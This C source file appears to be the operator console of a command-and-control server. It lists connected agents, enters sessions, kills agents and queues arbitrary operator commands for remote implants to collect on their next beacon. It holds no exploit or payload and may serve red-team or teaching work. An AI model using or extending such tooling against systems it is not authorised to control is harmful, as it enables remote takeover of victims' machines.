#include "Console.h"
#include <stdio.h>
#include <string.h>

static void ClearScreen(void)
{
#ifdef _WIN32
    int R = system("cls"); (void)R;
#else
    fputs("\033[2J\033[H", stdout);
    fflush(stdout);
#endif
}

void ConsolePrintHelp(void)
{
    printf("\n  Commands\n");
    printf("  %-20s %s\n", "help",              "Show this help");
    printf("  %-20s %s\n", "sessions",          "List active agents");
    printf("  %-20s %s\n", "use <id>",          "Interact with agent");
    printf("  %-20s %s\n", "back",              "Return to main console");
    printf("  %-20s %s\n", "clear",             "Clear screen");
    printf("  %-20s %s\n", "kill",              "Kill agent and disconnect");
    printf("  %-20s %s\n", "exit / quit",       "Shutdown server\n");
}

int ConsoleRead(char *Out, int Cap)
{
    if (fgets(Out, Cap, stdin) == NULL)
        return 0;
    Out[strcspn(Out, "\n")] = '\0';
    return 1;
}

static int IsCmd(const char *Input, const char *Cmd)
{
    return strcmp(Input, Cmd) == 0;
}

int ConsoleExec(const char *Line, Session *S)
{
    if (S->Interactive) {

        if (IsCmd(Line, "back")) {
            SessionLeave(S);

        } else if (IsCmd(Line, "clear")) {
            ClearScreen();
            printf("C2Session[%s]> ", S->Address);
            fflush(stdout);

        } else if (IsCmd(Line, "kill") || IsCmd(Line, "exit") || IsCmd(Line, "quit")) {
            SessionKill(S);
            printf("C2Main> ");
            fflush(stdout);

        } else if (IsCmd(Line, "help")) {
            ConsolePrintHelp();
            printf("C2Session[%s]> ", S->Address);
            fflush(stdout);

        } else if (strlen(Line) > 0) {
            SessionSendCommand(S, Line);
            printf("[*] Queued — waiting for beacon...\n");
            printf("C2Session[%s]> ", S->Address);
            fflush(stdout);

        } else {
            printf("C2Session[%s]> ", S->Address);
            fflush(stdout);
        }

        return 1;
    }

    if (IsCmd(Line, "help")) {
        ConsolePrintHelp();

    } else if (IsCmd(Line, "clear")) {
        ClearScreen();

    } else if (IsCmd(Line, "exit") || IsCmd(Line, "quit")) {
        printf("Shutting down.\n");
        return 0;

    } else if (IsCmd(Line, "sessions") || IsCmd(Line, "session")) {
        if (S->Active)
            printf("\n  [1]  %s  (active)\n\n", S->Address);
        else
            printf("  No active sessions.\n");

    } else if (IsCmd(Line, "use 1")      || IsCmd(Line, "interact 1") ||
               IsCmd(Line, "use")        || IsCmd(Line, "interact")) {
        if (S->Active)
            SessionEnter(S);
        else
            printf("[!] No active session.\n");
        return 1;

    } else if (strlen(Line) > 0) {
        printf("[!] Unknown command — type 'help'.\n");
    }

    printf("C2Main> ");
    fflush(stdout);
    return 1;
}
